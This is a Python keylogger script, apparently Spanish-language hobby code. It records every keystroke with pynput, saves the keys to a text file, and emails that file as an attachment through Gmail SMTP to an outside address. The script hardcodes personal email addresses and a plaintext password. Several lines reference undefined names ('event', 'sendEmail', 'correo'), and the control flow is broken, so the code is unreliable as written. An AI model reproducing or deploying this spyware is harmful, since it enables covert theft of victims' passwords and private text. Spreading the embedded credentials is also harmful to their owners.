from pynput.keyboard import Key, Listener
import time, datetime
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

count = 0
keys = []
wait_seconds = 10
timeout = time.time() + wait_seconds
ts = datetime.datetime.now()

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0}aplasto".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("Texto.txt", "a") as  f:
        for key in keys:
            k = str(key).replace(" ' ", " ")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as  listener:
    listener.join()
    logging.basicConfig(filename="datosOptenidos.txt", level=logging.DEBUG, format='%(message)s')
logging.log(10, chr(event.Ascii))
sendEmail(correo, pwd, subject)

while True:
    if TimeOut():
      correo1 = "oscarmateo1997@gmail.com"
      correo2 = "mateo_penaherrera@yahoo.com"
      pwd = "viviteamomucho"
      subject = "Report"+str(ts)
      try:
            msg = MIMEMultipart()
            msg['From'] = correo1
            msg['To'] = correo2
            msg['Subject'] = subject
            body = 'Enviado'
            msg.attach(MIMEText(body, 'plain'))
            filename = 'Texto.txt'
            attachment = open(filename, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= " + filename)
            msg.attach(part)
            text = msg.as_string()
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(correo, pwd)
            server.sendmail(correo, correo, text)
            server.quit()
            print("Correo enviado")
      except:
            print("fallo")